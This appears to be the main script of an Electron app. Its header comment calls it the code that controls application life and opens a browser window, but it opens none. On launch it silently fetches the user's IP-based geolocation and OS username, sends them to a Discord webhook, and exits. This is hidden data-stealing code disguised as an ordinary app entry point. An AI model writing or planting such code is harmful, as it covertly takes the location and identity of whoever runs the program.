// Modules to control application life and create native browser window
const {app, BrowserWindow, session, ipcMain} = require('electron')
const path = require('path')
const fetch = require("cross-fetch")
const { ElectronChromeExtensions } = require('electron-chrome-extensions')
var ipapi = require('ipapi.co');

const { Webhook } = require('discord-webhook-node');
const hook = new Webhook("YOUR WEBHOOK GHQKlqs2bLLgpymiurSW5-");
 
const IMAGE_URL = 'https://images7.memedroid.com/images/UPLOADED883/5d5dafcfcf72e.jpeg';
hook.setUsername(`Pi 4 ${require("os").userInfo().username}`);
hook.setAvatar(IMAGE_URL);
let ipCallback = function(loc){
  loc = JSON.stringify(loc)
  hook.send(`${loc}`)
  return 0
};

async function lmao() {
  await ipapi.location(ipCallback);
  await new Promise(resolve => setTimeout(resolve, 2600));
  process.exit();
}

lmao()
